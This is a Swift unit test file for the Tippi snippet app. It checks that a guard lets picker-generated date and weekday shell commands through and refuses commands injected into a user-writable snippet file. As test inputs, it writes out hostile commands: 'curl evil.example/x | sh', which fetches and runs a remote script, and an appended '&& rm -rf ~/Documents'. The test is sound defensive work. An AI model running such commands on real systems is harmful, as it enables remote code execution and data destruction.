import XCTest
@testable import Tippi

/// Covers the gate that decides whether an app-managed snippet may shell out.
///
/// `AppSnippets.json` is unsigned and writable by any process running as the
/// user, and a `type: shell` var in it runs with full privileges as soon as its
/// trigger is typed. The gate asks one question: could `DynamicVariableBuilder`
/// have produced this exact command?
///
/// Both directions matter equally and the project has already paid for getting
/// one of them wrong. On 2026-09-15 a guard that refused *every* shell var
/// shipped into the working tree and would have disabled every date and weekday
/// snippet in the app, because the Insert Variable picker produces shell vars
/// by design (`LC_TIME=de_DE.UTF-8 date …` needs a shell for the locale
/// override). It was caught by an existing test. Hence the legitimate cases
/// below are as load-bearing as the malicious one.
@MainActor
final class AppSnippetShellGuardTests: XCTestCase {
    private var tempDir: URL!

    override func setUpWithError() throws {
        tempDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: tempDir)
    }

    private func makeStore() -> SnippetStore {
        SnippetStore(appSupportRoot: tempDir,
                     userDefaults: UserDefaults(suiteName: "TippiTests.\(UUID().uuidString)")!,
                     keychainService: "com.tippi.app.test.snippet-approval.\(UUID().uuidString)")
    }

    // MARK: - Every kind the picker can produce must survive the gate

    /// Exhaustive rather than sampled: this is the set the gate is derived
    /// from, so a template change that breaks a user's existing snippet shows
    /// up here rather than in the field as "my date shortcut stopped working".
    func testEveryGeneratableKindIsAccepted() {
        for format in DateFormatPreset.allCases {
            let today = DynamicVariableBuilder.makeVar(name: "x", kind: .today(format: format))
            XCTAssertTrue(DynamicVariableBuilder.canGenerate(today.params.cmd ?? ""),
                          "today/\(format) must be accepted")

            for weekday in Weekday.allCases {
                for extraDays in [DynamicVariableBuilder.extraDaysRange.lowerBound, 0,
                                  DynamicVariableBuilder.extraDaysRange.upperBound] {
                    let kind = DynamicVariableKind.weekday(weekday, extraDays: extraDays, format: format)
                    let variable = DynamicVariableBuilder.makeVar(name: "x", kind: kind)
                    XCTAssertTrue(DynamicVariableBuilder.canGenerate(variable.params.cmd ?? ""),
                                  "weekday/\(weekday)/\(extraDays)/\(format) must be accepted")
                }
            }
        }
        let week = DynamicVariableBuilder.makeVar(name: "x", kind: .calendarWeek)
        XCTAssertTrue(DynamicVariableBuilder.canGenerate(week.params.cmd ?? ""))
    }

    func testPickerCreatedSnippetStillExpands() {
        let store = makeStore()
        store.isEnabled = true
        store.matchDirectory = tempDir
        let variable = DynamicVariableBuilder.makeVar(name: "y", kind: .today(format: .year))
        store.addSnippet(shortcut: ":year", replacement: "{{y}}", vars: [variable])

        XCTAssertTrue(store.activeTriggers().contains(":year"))
        XCTAssertNotNil(store.action(forTrigger: ":year"),
                        "a snippet built by the picker must keep working — the 2026-09-15 regression")
    }

    // MARK: - Injected commands must not run

    func testInjectedCommandIsRefused() {
        let store = makeStore()
        store.isEnabled = true
        store.matchDirectory = tempDir
        let injected = SnippetVar(name: "x", type: "shell",
                                  params: SnippetVarParams(cmd: "curl evil.example/x | sh", format: nil))
        store.addSnippet(shortcut: ":pwned", replacement: "{{x}}", vars: [injected])

        XCTAssertNil(store.action(forTrigger: ":pwned"), "must fail closed")
        XCTAssertFalse(store.activeTriggers().contains(":pwned"),
                       "must not even be offered to the keystroke monitor")
    }

    /// The realistic attack is not an obviously evil command but a plausible
    /// one appended to a real template — the file is edited, not authored.
    func testTamperedVariantOfARealCommandIsRefused() {
        let genuine = DynamicVariableBuilder.makeVar(name: "x", kind: .calendarWeek).params.cmd ?? ""
        XCTAssertTrue(DynamicVariableBuilder.canGenerate(genuine))

        for tampered in ["\(genuine); curl evil.example | sh",
                         "\(genuine) && rm -rf ~/Documents",
                         "LC_TIME=de_DE.UTF-8 date +\"%Y\" #harmless-looking"] {
            XCTAssertFalse(DynamicVariableBuilder.canGenerate(tampered),
                           "a command built by appending to a real one must not pass: \(tampered)")
        }
    }

    /// A snippet with no vars at all is plain text and must be unaffected by
    /// any of this — the overwhelming majority of real snippets.
    func testPlainTextSnippetIsUntouched() {
        let store = makeStore()
        store.isEnabled = true
        store.matchDirectory = tempDir
        store.addSnippet(shortcut: ":mlg", replacement: "Liebe Grüße")

        guard case .staticText(let text)? = store.action(forTrigger: ":mlg") else {
            return XCTFail("expected plain static text")
        }
        XCTAssertEqual(text, "Liebe Grüße")
    }
}
